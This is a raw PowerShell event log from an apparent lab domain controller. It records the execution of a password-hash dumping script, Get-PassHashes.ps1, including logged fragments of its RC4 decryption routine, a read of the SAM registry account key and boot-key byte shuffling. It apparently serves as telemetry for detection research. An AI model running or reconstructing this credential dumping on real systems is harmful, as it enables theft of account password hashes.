                $temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp;
                "
ParameterBinding(ForEach-Object): name="InputObject"; value="0"
ParameterBinding(ForEach-Object): name="InputObject"; value="1"
ParameterBinding(ForEach-Object): name="InputObject"; value="2"
ParameterBinding(ForEach-Object): name="InputObject"; value="3"
ParameterBinding(ForEach-Object): name="InputObject"; value="4"
ParameterBinding(ForEach-Object): name="InputObject"; value="5"
ParameterBinding(ForEach-Object): name="InputObject"; value="6"
ParameterBinding(ForEach-Object): name="InputObject"; value="7"
ParameterBinding(ForEach-Object): name="InputObject"; value="8"
ParameterBinding(ForEach-Object): name="InputObject"; value="9"
ParameterBinding(ForEach-Object): name="InputObject"; value="10"
ParameterBinding(ForEach-Object): name="InputObject"; value="11"
ParameterBinding(ForEach-Object): name="InputObject"; value="12"
ParameterBinding(ForEach-Object): name="InputObject"; value="13"
ParameterBinding(ForEach-Object): name="InputObject"; value="14"
ParameterBinding(ForEach-Object): name="InputObject"; value="15"
ParameterBinding(ForEach-Object): name="InputObject"; value="16"
ParameterBinding(ForEach-Object): name="InputObject"; value="17"
ParameterBinding(ForEach-Object): name="InputObject"; value="18"
ParameterBinding(ForEach-Object): name="InputObject"; value="19"
ParameterBinding(ForEach-Object): name="InputObject"; value="20"
ParameterBinding(ForEach-Object): name="InputObject"; value="21"
ParameterBinding(ForEach-Object): name="InputObject"; value="22"
ParameterBinding(ForEach-Object): name="InputObject"; value="23"
ParameterBinding(ForEach-Object): name="InputObject"; value="24"
ParameterBinding(ForEach-Object): name="InputObject"; value="25"
ParameterBinding(ForEach-Object): name="InputObject"; value="26"
ParameterBinding(ForEach-Object): name="InputObject"; value="27"
ParameterBinding(ForEach-Object): name="InputObject"; value="28"
ParameterBinding(ForEach-Object): name="InputObject"; value="29"
ParameterBinding(ForEach-Object): name="InputObject"; value="30"
ParameterBinding(ForEach-Object): name="InputObject"; value="31"
ParameterBinding(ForEach-Object): name="InputObject"; value="32"
ParameterBinding(ForEach-Object): name="InputObject"; value="33"
ParameterBinding(ForEach-Object): name="InputObject"; value="34"
ParameterBinding(ForEach-Object): name="InputObject"; value="35"
ParameterBinding(ForEach-Object): name="InputObject"; value="36"
ParameterBinding(ForEach-Object): name="InputObject"; value="37"
ParameterBinding(ForEach-Object): name="InputObject"; value="38"
ParameterBinding(ForEach-Object): name="InputObject"; value="39"
ParameterBinding(ForEach-Object): name="InputObject"; value="40"
ParameterBinding(ForEach-Object): name="InputObject"; value="41"
ParameterBinding(ForEach-Object): name="InputObject"; value="42"
ParameterBinding(ForEach-Object): name="InputObject"; value="43"
ParameterBinding(ForEach-Object): name="InputObject"; value="44"
ParameterBinding(ForEach-Object): name="InputObject"; value="45"
ParameterBinding(ForEach-Object): name="InputObject"; value="46"
ParameterBinding(ForEach-Object): name="InputObject"; value="47"
ParameterBinding(ForEach-Object): name="InputObject"; value="48"
ParameterBinding(ForEach-Object): name="InputObject"; value="49"
ParameterBinding(ForEach-Object): name="InputObject"; value="50"
ParameterBinding(ForEach-Object): name="InputObject"; value="51"
ParameterBinding(ForEach-Object): name="InputObject"; value="52"
ParameterBinding(ForEach-Object): name="InputObject"; value="53"
ParameterBinding(ForEach-Object): name="InputObject"; value="54"
ParameterBinding(ForEach-Object): name="InputObject"; value="55"
ParameterBinding(ForEach-Object): name="InputObject"; value="56"
ParameterBinding(ForEach-Object): name="InputObject"; value="57"
ParameterBinding(ForEach-Object): name="InputObject"; value="58"
ParameterBinding(ForEach-Object): name="InputObject"; value="59"
ParameterBinding(ForEach-Object): name="InputObject"; value="60"
ParameterBinding(ForEach-Object): name="InputObject"; value="61"
ParameterBinding(ForEach-Object): name="InputObject"; value="62"
ParameterBinding(ForEach-Object): name="InputObject"; value="63"
ParameterBinding(ForEach-Object): name="InputObject"; value="64"
ParameterBinding(ForEach-Object): name="InputObject"; value="65"
ParameterBinding(ForEach-Object): name="InputObject"; value="66"
ParameterBinding(ForEach-Object): name="InputObject"; value="67"
ParameterBinding(ForEach-Object): name="InputObject"; value="68"
ParameterBinding(ForEach-Object): name="InputObject"; value="69"
ParameterBinding(ForEach-Object): name="InputObject"; value="70"
ParameterBinding(ForEach-Object): name="InputObject"; value="71"
ParameterBinding(ForEach-Object): name="InputObject"; value="72"
ParameterBinding(ForEach-Object): name="InputObject"; value="73"
ParameterBinding(ForEach-Object): name="InputObject"; value="74"
ParameterBinding(ForEach-Object): name="InputObject"; value="75"
ParameterBinding(ForEach-Object): name="InputObject"; value="76"
ParameterBinding(ForEach-Object): name="InputObject"; value="77"
ParameterBinding(ForEach-Object): name="InputObject"; value="78"
ParameterBinding(ForEach-Object): name="InputObject"; value="79"
ParameterBinding(ForEach-Object): name="InputObject"; value="80"
ParameterBinding(ForEach-Object): name="InputObject"; value="81"
ParameterBinding(ForEach-Object): name="InputObject"; value="82"
ParameterBinding(ForEach-Object): name="InputObject"; value="83"
ParameterBinding(ForEach-Object): name="InputObject"; value="84"
ParameterBinding(ForEach-Object): name="InputObject"; value="85"
ParameterBinding(ForEach-Object): name="InputObject"; value="86"
ParameterBinding(ForEach-Object): name="InputObject"; value="87"
ParameterBinding(ForEach-Object): name="InputObject"; value="88"
ParameterBinding(ForEach-Object): name="InputObject"; value="89"
ParameterBinding(ForEach-Object): name="InputObject"; value="90"
ParameterBinding(ForEach-Object): name="InputObject"; value="91"
ParameterBinding(ForEach-Object): name="InputObject"; value="92"
ParameterBinding(ForEach-Object): name="InputObject"; value="93"
ParameterBinding(ForEach-Object): name="InputObject"; value="94"
ParameterBinding(ForEach-Object): name="InputObject"; value="95"
ParameterBinding(ForEach-Object): name="InputObject"; value="96"
ParameterBinding(ForEach-Object): name="InputObject"; value="97"
ParameterBinding(ForEach-Object): name="InputObject"; value="98"
ParameterBinding(ForEach-Object): name="InputObject"; value="99"
ParameterBinding(ForEach-Object): name="InputObject"; value="100"
ParameterBinding(ForEach-Object): name="InputObject"; value="101"
ParameterBinding(ForEach-Object): name="InputObject"; value="102"
ParameterBinding(ForEach-Object): name="InputObject"; value="103"
ParameterBinding(ForEach-Object): name="InputObject"; value="104"
ParameterBinding(ForEach-Object): name="InputObject"; value="105"
ParameterBinding(ForEach-Object): name="InputObject"; value="106"
ParameterBinding(ForEach-Object): name="InputObject"; value="107"
ParameterBinding(ForEach-Object): name="InputObject"; value="108"
ParameterBinding(ForEach-Object): name="InputObject"; value="109"
ParameterBinding(ForEach-Object): name="InputObject"; value="110"
ParameterBinding(ForEach-Object): name="InputObject"; value="111"
ParameterBinding(ForEach-Object): name="InputObject"; value="112"
ParameterBinding(ForEach-Object): name="InputObject"; value="113"
ParameterBinding(ForEach-Object): name="InputObject"; value="114"
ParameterBinding(ForEach-Object): name="InputObject"; value="115"
ParameterBinding(ForEach-Object): name="InputObject"; value="116"
ParameterBinding(ForEach-Object): name="InputObject"; value="117"
ParameterBinding(ForEach-Object): name="InputObject"; value="118"
ParameterBinding(ForEach-Object): name="InputObject"; value="119"
ParameterBinding(ForEach-Object): name="InputObject"; value="120"
ParameterBinding(ForEach-Object): name="InputObject"; value="121"
ParameterBinding(ForEach-Object): name="InputObject"; value="122"
ParameterBinding(ForEach-Object): name="InputObject"; value="123"
ParameterBinding(ForEach-Object): name="InputObject"; value="124"
ParameterBinding(ForEach-Object): name="InputObject"; value="125"
ParameterBinding(ForEach-Object): name="InputObject"; value="126"
ParameterBinding(ForEach-Object): name="InputObject"; value="127"
ParameterBinding(ForEach-Object): name="InputObject"; value="128"
ParameterBinding(ForEach-Object): name="InputObject"; value="129"
ParameterBinding(ForEach-Object): name="InputObject"; value="130"
ParameterBinding(ForEach-Object): name="InputObject"; value="131"
ParameterBinding(ForEach-Object): name="InputObject"; value="132"
ParameterBinding(ForEach-Object): name="InputObject"; value="133"
ParameterBinding(ForEach-Object): name="InputObject"; value="134"
ParameterBinding(ForEach-Object): name="InputObject"; value="135"
ParameterBinding(ForEach-Object): name="InputObject"; value="136"
ParameterBinding(ForEach-Object): name="InputObject"; value="137"
ParameterBinding(ForEach-Object): name="InputObject"; value="138"
ParameterBinding(ForEach-Object): name="InputObject"; value="139"
ParameterBinding(ForEach-Object): name="InputObject"; value="140"
ParameterBinding(ForEach-Object): name="InputObject"; value="141"
ParameterBinding(ForEach-Object): name="InputObject"; value="142"
ParameterBinding(ForEach-Object): name="InputObject"; value="143"
ParameterBinding(ForEach-Object): name="InputObject"; value="144"
ParameterBinding(ForEach-Object): name="InputObject"; value="145"
ParameterBinding(ForEach-Object): name="InputObject"; value="146"
ParameterBinding(ForEach-Object): name="InputObject"; value="147"
ParameterBinding(ForEach-Object): name="InputObject"; value="148"
ParameterBinding(ForEach-Object): name="InputObject"; value="149"
ParameterBinding(ForEach-Object): name="InputObject"; value="150"
ParameterBinding(ForEach-Object): name="InputObject"; value="151"
ParameterBinding(ForEach-Object): name="InputObject"; value="152"
ParameterBinding(ForEach-Object): name="InputObject"; value="153"
ParameterBinding(ForEach-Object): name="InputObject"; value="154"
ParameterBinding(ForEach-Object): name="InputObject"; value="155"
ParameterBinding(ForEach-Object): name="InputObject"; value="156"
ParameterBinding(ForEach-Object): name="InputObject"; value="157"
ParameterBinding(ForEach-Object): name="InputObject"; value="158"
ParameterBinding(ForEach-Object): name="InputObject"; value="159"
ParameterBinding(ForEach-Object): name="InputObject"; value="160"
ParameterBinding(ForEach-Object): name="InputObject"; value="161"
ParameterBinding(ForEach-Object): name="InputObject"; value="162"
ParameterBinding(ForEach-Object): name="InputObject"; value="163"
ParameterBinding(ForEach-Object): name="InputObject"; value="164"
ParameterBinding(ForEach-Object): name="InputObject"; value="165"
ParameterBinding(ForEach-Object): name="InputObject"; value="166"
ParameterBinding(ForEach-Object): name="InputObject"; value="167"
ParameterBinding(ForEach-Object): name="InputObject"; value="168"
ParameterBinding(ForEach-Object): name="InputObject"; value="169"
ParameterBinding(ForEach-Object): name="InputObject"; value="170"
ParameterBinding(ForEach-Object): name="InputObject"; value="171"
ParameterBinding(ForEach-Object): name="InputObject"; value="172"
ParameterBinding(ForEach-Object): name="InputObject"; value="173"
ParameterBinding(ForEach-Object): name="InputObject"; value="174"
ParameterBinding(ForEach-Object): name="InputObject"; value="175"
ParameterBinding(ForEach-Object): name="InputObject"; value="176"
ParameterBinding(ForEach-Object): name="InputObject"; value="177"
ParameterBinding(ForEach-Object): name="InputObject"; value="178"
ParameterBinding(ForEach-Object): name="InputObject"; value="179"
ParameterBinding(ForEach-Object): name="InputObject"; value="180"
ParameterBinding(ForEach-Object): name="InputObject"; value="181"
ParameterBinding(ForEach-Object): name="InputObject"; value="182"
ParameterBinding(ForEach-Object): name="InputObject"; value="183"
ParameterBinding(ForEach-Object): name="InputObject"; value="184"
ParameterBinding(ForEach-Object): name="InputObject"; value="185"
ParameterBinding(ForEach-Object): name="InputObject"; value="186"
ParameterBinding(ForEach-Object): name="InputObject"; value="187"
ParameterBinding(ForEach-Object): name="InputObject"; value="188"
ParameterBinding(ForEach-Object): name="InputObject"; value="189"
ParameterBinding(ForEach-Object): name="InputObject"; value="190"
ParameterBinding(ForEach-Object): name="InputObject"; value="191"
ParameterBinding(ForEach-Object): name="InputObject"; value="192"
ParameterBinding(ForEach-Object): name="InputObject"; value="193"
ParameterBinding(ForEach-Object): name="InputObject"; value="194"
ParameterBinding(ForEach-Object): name="InputObject"; value="195"
ParameterBinding(ForEach-Object): name="InputObject"; value="196"
ParameterBinding(ForEach-Object): name="InputObject"; value="197"
ParameterBinding(ForEach-Object): name="InputObject"; value="198"
ParameterBinding(ForEach-Object): name="InputObject"; value="199"
ParameterBinding(ForEach-Object): name="InputObject"; value="200"
ParameterBinding(ForEach-Object): name="InputObject"; value="201"
ParameterBinding(ForEach-Object): name="InputObject"; value="202"
ParameterBinding(ForEach-Object): name="InputObject"; value="203"
ParameterBinding(ForEach-Object): name="InputObject"; value="204"
ParameterBinding(ForEach-Object): name="InputObject"; value="205"
ParameterBinding(ForEach-Object): name="InputObject"; value="206"
ParameterBinding(ForEach-Object): name="InputObject"; value="207"
ParameterBinding(ForEach-Object): name="InputObject"; value="208"
ParameterBinding(ForEach-Object): name="InputObject"; value="209"
ParameterBinding(ForEach-Object): name="InputObject"; value="210"
ParameterBinding(ForEach-Object): name="InputObject"; value="211"
ParameterBinding(ForEach-Object): name="InputObject"; value="212"
ParameterBinding(ForEach-Object): name="InputObject"; value="213"
ParameterBinding(ForEach-Object): name="InputObject"; value="214"
ParameterBinding(ForEach-Object): name="InputObject"; value="215"
ParameterBinding(ForEach-Object): name="InputObject"; value="216"
ParameterBinding(ForEach-Object): name="InputObject"; value="217"
ParameterBinding(ForEach-Object): name="InputObject"; value="218"
ParameterBinding(ForEach-Object): name="InputObject"; value="219"
ParameterBinding(ForEach-Object): name="InputObject"; value="220"
ParameterBinding(ForEach-Object): name="InputObject"; value="221"
ParameterBinding(ForEach-Object): name="InputObject"; value="222"
ParameterBinding(ForEach-Object): name="InputObject"; value="223"
ParameterBinding(ForEach-Object): name="InputObject"; value="224"
ParameterBinding(ForEach-Object): name="InputObject"; value="225"
ParameterBinding(ForEach-Object): name="InputObject"; value="226"
ParameterBinding(ForEach-Object): name="InputObject"; value="227"
ParameterBinding(ForEach-Object): name="InputObject"; value="228"
ParameterBinding(ForEach-Object): name="InputObject"; value="229"
ParameterBinding(ForEach-Object): name="InputObject"; value="230"
ParameterBinding(ForEach-Object): name="InputObject"; value="231"
ParameterBinding(ForEach-Object): name="InputObject"; value="232"
ParameterBinding(ForEach-Object): name="InputObject"; value="233"
ParameterBinding(ForEach-Object): name="InputObject"; value="234"
ParameterBinding(ForEach-Object): name="InputObject"; value="235"
ParameterBinding(ForEach-Object): name="InputObject"; value="236"
ParameterBinding(ForEach-Object): name="InputObject"; value="237"
ParameterBinding(ForEach-Object): name="InputObject"; value="238"
ParameterBinding(ForEach-Object): name="InputObject"; value="239"
ParameterBinding(ForEach-Object): name="InputObject"; value="240"
ParameterBinding(ForEach-Object): name="InputObject"; value="241"
ParameterBinding(ForEach-Object): name="InputObject"; value="242"
ParameterBinding(ForEach-Object): name="InputObject"; value="243"
ParameterBinding(ForEach-Object): name="InputObject"; value="244"
ParameterBinding(ForEach-Object): name="InputObject"; value="245"
ParameterBinding(ForEach-Object): name="InputObject"; value="246"
ParameterBinding(ForEach-Object): name="InputObject"; value="247"
ParameterBinding(ForEach-Object): name="InputObject"; value="248"
ParameterBinding(ForEach-Object): name="InputObject"; value="249"
ParameterBinding(ForEach-Object): name="InputObject"; value="250"
ParameterBinding(ForEach-Object): name="InputObject"; value="251"
ParameterBinding(ForEach-Object): name="InputObject"; value="252"
ParameterBinding(ForEach-Object): name="InputObject"; value="253"
ParameterBinding(ForEach-Object): name="InputObject"; value="254"
ParameterBinding(ForEach-Object): name="InputObject"; value="255"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Object"
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="PassThru"; value="True"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="key"
ParameterBinding(Add-Member): name="Value"; value="6, 253, 188, 75, 220, 238, 133, 38, 41, 30, 82, 59, 102, 226, 133, 40"
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="PassThru"; value="True"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="S"
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="PassThru"; value="True"
ParameterBinding(Add-Member): name="MemberType"; value="ScriptMethod"
ParameterBinding(Add-Member): name="Name"; value="init"
ParameterBinding(Add-Member): name="Value"; value="
        if (-not $this.S)
        {
            [byte[]]$this.S = 0..255;
            0..255 | % -begin{[long]$j=0;}{
                $j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length;
                $temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp;
                }
        }
    "
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="PassThru"; value="True"
ParameterBinding(Add-Member): name="MemberType"; value="ScriptMethod"
ParameterBinding(Add-Member): name="Name"; value="encrypt"
ParameterBinding(Add-Member): name="Value"; value="
        $data = $args[0];
        $this.init();
        $outbuf = new-object byte[] $($data.Length);
        $S2 = $this.S[0..$this.S.Length];
        0..$($data.Length-1) | % -begin{$i=0;$j=0;} {
            $i = ($i+1) % $S2.Length;
            $j = ($j + $S2[$i]) % $S2.Length;
            $temp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $temp;
            $a = $data[$_];
            $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
            $outbuf[$_] = ($a -bxor $b);
        }
        return ,$outbuf;
    "
ParameterBinding(Add-Member): name="InputObject"; value="System.Object"
ParameterBinding(Add-Member): name="InputObject"; value="System.Object"
ParameterBinding(Add-Member): name="InputObject"; value="System.Object"
ParameterBinding(Add-Member): name="InputObject"; value="System.Object"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 96
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.513205000Z" />
    <EventRecordID>14229</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-6d3b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = New-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 96
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="Object"
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="PassThru"; value="True"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="key"
ParameterBinding(Add-Member): name="Value"; value="6, 253, 188, 75, 220, 238, 133, 38, 41, 30, 82, 59, 102, 226, 133, 40"
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="PassThru"; value="True"
ParameterBinding(Add-Member): name="MemberType"; value="NoteProperty"
ParameterBinding(Add-Member): name="Name"; value="S"
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="PassThru"; value="True"
ParameterBinding(Add-Member): name="MemberType"; value="ScriptMethod"
ParameterBinding(Add-Member): name="Name"; value="init"
ParameterBinding(Add-Member): name="Value"; value="
        if (-not $this.S)
        {
            [byte[]]$this.S = 0..255;
            0..255 | % -begin{[long]$j=0;}{
                $j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length;
                $temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp;
                }
        }
    "
CommandInvocation(Add-Member): "Add-Member"
ParameterBinding(Add-Member): name="PassThru"; value="True"
ParameterBinding(Add-Member): name="MemberType"; value="ScriptMethod"
ParameterBinding(Add-Member): name="Name"; value="encrypt"
ParameterBinding(Add-Member): name="Value"; value="
        $data = $args[0];
        $this.init();
        $outbuf = new-object byte[] $($data.Length);
        $S2 = $this.S[0..$this.S.Length];
        0..$($data.Length-1) | % -begin{$i=0;$j=0;} {
            $i = ($i+1) % $S2.Length;
            $j = ($j + $S2[$i]) % $S2.Length;
            $temp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $temp;
            $a = $data[$_];
            $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
            $outbuf[$_] = ($a -bxor $b);
        }
        return ,$outbuf;
    "
ParameterBinding(Add-Member): name="InputObject"; value="System.Object"
ParameterBinding(Add-Member): name="InputObject"; value="System.Object"
ParameterBinding(Add-Member): name="InputObject"; value="System.Object"
ParameterBinding(Add-Member): name="InputObject"; value="System.Object"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(Get-Item): "Get-Item"
ParameterBinding(Get-Item): name="Path"; value="HKLM:\SAM\SAM\Domains\Account"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Get-Item
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 94
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.490857500Z" />
    <EventRecordID>14228</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-613b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = Get-Item
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 94
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(Get-Item): "Get-Item"
ParameterBinding(Get-Item): name="Path"; value="HKLM:\SAM\SAM\Domains\Account"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(ForEach-Object): "ForEach-Object"
ParameterBinding(ForEach-Object): name="Begin"; value="$i=0;"
ParameterBinding(ForEach-Object): name="Process"; value="$b2[$i]=$b[$_];$i++"
ParameterBinding(ForEach-Object): name="InputObject"; value="8"
ParameterBinding(ForEach-Object): name="InputObject"; value="5"
ParameterBinding(ForEach-Object): name="InputObject"; value="4"
ParameterBinding(ForEach-Object): name="InputObject"; value="2"
ParameterBinding(ForEach-Object): name="InputObject"; value="11"
ParameterBinding(ForEach-Object): name="InputObject"; value="9"
ParameterBinding(ForEach-Object): name="InputObject"; value="13"
ParameterBinding(ForEach-Object): name="InputObject"; value="3"
ParameterBinding(ForEach-Object): name="InputObject"; value="0"
ParameterBinding(ForEach-Object): name="InputObject"; value="6"
ParameterBinding(ForEach-Object): name="InputObject"; value="1"
ParameterBinding(ForEach-Object): name="InputObject"; value="12"
ParameterBinding(ForEach-Object): name="InputObject"; value="14"
ParameterBinding(ForEach-Object): name="InputObject"; value="10"
ParameterBinding(ForEach-Object): name="InputObject"; value="15"
ParameterBinding(ForEach-Object): name="InputObject"; value="7"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = ForEach-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 92
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell


User Data:


Event Xml:
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" />
    <EventID>4103</EventID>
    <Version>1</Version>
    <Level>4</Level>
    <Task>106</Task>
    <Opcode>20</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="2025-02-24T01:43:27.483686800Z" />
    <EventRecordID>14227</EventRecordID>
    <Correlation ActivityID="{181f2766-865c-0000-5f3b-1f185c86db01}" />
    <Execution ProcessID="2556" ThreadID="284" />
    <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
    <Computer>DC.sccm.lab</Computer>
    <Security UserID="S-1-5-21-1995092367-784345370-2199465104-1000" />
  </System>
  <EventData>
    <Data Name="ContextInfo">        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
        Host ID = e26257d8-2775-4ca9-8681-ec9fce3f48f1
        Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
        Engine Version = 5.1.17763.6893
        Runspace ID = 99c18dbc-d5d6-4a23-9a87-f77958d01bd1
        Pipeline ID = 29
        Command Name = ForEach-Object
        Command Type = Cmdlet
        Script Name = C:\Users\vagrant\Downloads\Commands\HashDump\Get-PassHashes.ps1
        Command Path = 
        Sequence Number = 92
        User = SCCMLAB\vagrant
        Connected User = 
        Shell ID = Microsoft.PowerShell
</Data>
    <Data Name="UserData">
    </Data>
    <Data Name="Payload">CommandInvocation(ForEach-Object): "ForEach-Object"
ParameterBinding(ForEach-Object): name="Begin"; value="$i=0;"
ParameterBinding(ForEach-Object): name="Process"; value="$b2[$i]=$b[$_];$i++"
ParameterBinding(ForEach-Object): name="InputObject"; value="8"
ParameterBinding(ForEach-Object): name="InputObject"; value="5"
ParameterBinding(ForEach-Object): name="InputObject"; value="4"
ParameterBinding(ForEach-Object): name="InputObject"; value="2"
ParameterBinding(ForEach-Object): name="InputObject"; value="11"
ParameterBinding(ForEach-Object): name="InputObject"; value="9"
ParameterBinding(ForEach-Object): name="InputObject"; value="13"
ParameterBinding(ForEach-Object): name="InputObject"; value="3"
ParameterBinding(ForEach-Object): name="InputObject"; value="0"
ParameterBinding(ForEach-Object): name="InputObject"; value="6"
ParameterBinding(ForEach-Object): name="InputObject"; value="1"
ParameterBinding(ForEach-Object): name="InputObject"; value="12"
ParameterBinding(ForEach-Object): name="InputObject"; value="14"
ParameterBinding(ForEach-Object): name="InputObject"; value="10"
ParameterBinding(ForEach-Object): name="InputObject"; value="15"
ParameterBinding(ForEach-Object): name="InputObject"; value="7"
</Data>
  </EventData>
</Event>

Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Date:          2/23/2025 5:43:27 PM
Event ID:      4103
Task Category: Executing Pipeline
Level:         Information
Keywords:      None
User:          SCCMLAB\vagrant
Computer:      DC.sccm.lab
Description:
CommandInvocation(New-Object): "New-Object"
ParameterBinding(New-Object): name="TypeName"; value="byte[]"
ParameterBinding(New-Object): name="ArgumentList"; value="16"


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17763.6893
